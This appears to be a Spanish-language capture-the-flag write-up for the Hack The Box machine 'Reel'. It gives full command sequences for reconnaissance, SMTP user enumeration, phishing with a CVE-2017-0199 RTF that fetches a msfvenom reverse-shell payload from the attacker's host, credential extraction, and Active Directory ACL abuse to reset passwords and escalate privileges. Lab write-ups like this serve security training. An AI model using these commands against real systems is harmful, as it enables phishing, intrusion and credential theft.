---
layout: post
author: Sergio Salgado
---

|     Iformation         |      Link          |
|:-----------------------|:-------------------|
| Name                   | Reel               |
| Os                     | Windows            |
| Difficulty             | Hard               |
| Points                 | 0                  |
| IP                     | 10.10.10.77        |


## [](#header-2)Reconocimiento

Primero utilizaremos la herramienta que hace la identificación de conexión silenciosa y reconocimiento del sistema al que nos presentamos.

![Scan 1](/assets/images/Reel/scan1.png)

### [](#header-3)NMAP   

El primer escaneo rápido con nmap, para poder agilizar mientras más búsquedas o búsqueda de vulnerabilidades sobre esos puertos.

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.10.10.77
```

![nmap 1](/assets/images/Reel/nmap1.png)

El segundo escaneo, ya un poco más profundo será:

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.77 -oG allPorts
```

![nmap2](/assets/images/Reel/nmap2.png)

Después de tener los puertos, se puede hacer un escaneo ahora directo a los puertos con:

```s
sudo nmap -sCV -p21,22,25 10.10.10.77 -oN targeted
```

![nmap3](/assets/images/Reel/nmap3.png)

Podemos empezar a probar por el servicio de ftp si tiene activado el usuario Anonymous con contrasena anonymous. Vemos por dentro que existen 3 archivos, para descargarlos esta vez insertaremos:

```s
prompt off
mget *
```

Existe un archivo que esta corrupto de los descargados, este lo podemos reparar con libreoffice, pero no fue este el caso. Aun asi podemos ver metadata, en el cual vemos un correo electronico, podemos tratar de validar si existe este correo y el servidor lo reconozca.

```s
exiftool *.docx | grep "Creator"
```

USaremos telnet de la siguiente forma:

```s
telnet 10.10.10.77 25
HELO data.com
#Una manera es usando el VRFY nico@megabank.com, pero en este caso esta desabilitado
#Mandaremos un correo
MAIL FROM: <rebick@megabank.com>
#Si ingresamos un correo no valido, nos aparecera que el host no esta reconocido.
RCPT TO: <nico@megabank.com>
```

![telnet test](/assets/images/Reel/telnet1.png)

Podemos ahora entonces enumerar correos

```s
smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.77
```

Ahora procedemos a mandar un <a href="https://github.com/bhdresh/CVE-2017-0199"> RTF malicioso</a>, pero antes haremos el payload con:

```s
msfvenom -p windows/shell_reverse_tcp  LHOST=10.10.14.29 LPORT=4444 -f hta-psh -o malicious.hta
```

Despues nos ponemos en escucha con python para que se descargue este payload.

```s
sudo python3 -m http.server 80
```

Y en el programa del CVE para explotarlo metemos:

```s
python2 cve-2017-0199_toolkit.py -M gen -w test.rtf -u http://10.10.14.29/malicious.hta -t RTF -x 0
```

Nos ponemos en escucha con netcat tambien:

```s
rlwrap nc -nlvp 4444
```

Mandamos el email

```s
sendEmail -f rebick@megabank.com -t nico@megabank.com -u "IMPORTANTE" -m "Checa esto" -s 10.10.10.77:25 -a test.rtf -v
```

![email sent](/assets/images/Reel/email_sent.png)

Y hemos obtenido acceso.

![Sys access](/assets/images/Reel/sys_access1.png)

Una vez dentro, podemos acceder a la flag en el usuario Nico. Para seguir con la escalada de privilegios empecemos a enumerar informacion

```s
#Para ver nuestros privilegios:
whoami /priv
```

Dentro del Escritorio de Nico tambien hay un archivo llamado cred.xml. Donde se encuentra una contrasena y para verlo lo que haremos es:

```s
powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.getNetworkCredential() | Format-list *" 
```

![Tom credentials](/assets/images/Reel/tom_creds.png)

Ahora que tenemos las credenciales de Tom, podemos intentar hacer un login por ssh y si funcionara.

Vemos que han corrido el BloodHound para escanear informacion sobre el AD, este puede ser explotado a travez del SharpHound.exe o .ps1 de la siguiente manera:

```s
#No montamos un servidor smb
impacket-smbserver smbfolder $(pwd) -smb2support

#En la maquina windows descargamos el archivo con 
copy acls.csv \\10.10.14.29\smbFolder\acls.csv
```

En este archivo de acls vemos que tom tiene permiso de escritura sobre claire, esto significa que podriamos cambiarle la contrasena a claire con powershell de la siguiente manera:

```s
powershell
Import-Module .\PowerView.ps1
Set-DomainObjectOwner -Identity claire -OwnerIdentity tom
Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword 
$cred = ConvertTo-SecureString "rebick1234!" -AsPlainText -Force
Set-DomainUserPassword -Identity claire -AccountPassword $cred
```

Y ahora tenemos acceso a claire

![Claire Access](/assets/images/Reel/claire_access.png)

Claire tiene acceso de escritura sobre el grupo de backup_admins, pero no pertenecemos al grupo aun; asi que lo que ahora podemos hacer es:

```s
#Para meternos en el grupo
net group Backup_admins claire /add
```

Ahora podemos meternos a la carpeta de Administrador, pero aun no podemos leer la flag, para poder leerla, existen unos archivos de Backup Scripts

```s
powershell
dir | Select-String "Password"
```

![Admin Password](/assets/images/Reel/admin_password.png)

Ahora ya tendremos la contrasena de root y podremos solicitar una conexion por ssh para leer la flag

![Admin](/assets/images/Reel/root.png)

![Powned](/assets/images/Reel/powned.png)